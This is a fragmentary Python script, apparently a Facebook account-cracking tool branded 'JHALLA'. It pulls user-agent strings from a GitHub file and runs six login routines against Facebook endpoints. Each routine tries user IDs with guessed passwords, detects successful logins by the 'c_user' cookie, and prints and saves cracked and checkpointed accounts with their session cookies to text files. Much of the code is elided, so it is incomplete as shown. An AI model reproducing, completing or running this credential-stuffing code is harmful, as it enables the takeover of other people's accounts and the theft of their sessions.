...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/Jhalla11/saira/blob/main/saira.txt').text
		ua=open('.ua2.txt','w')
...
/  |  ||  |  ||  _  ||     ||     ||  _  |
\  `  ||  |  ||  |  ||     ||     ||  |  |
 \____j|__|__||__|__||_____||_____||__|__|                                          
[+]==============================================
...
def xerx1():
	...
	print('[?] Ids saved in JHALLA-OK.txt,JHALLA-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[JHALLA-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in xerx_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[JHALLA-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'service-worker-navigation-preload': '{"r":1006879974,"y":"wblt"}',
    'upgrade-insecure-requests': '1',
			'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			'user-agent': pro}
			lo = session.post('https://d.facebook.com/', cookies=cookies, headers=headers).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-JHALLA] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
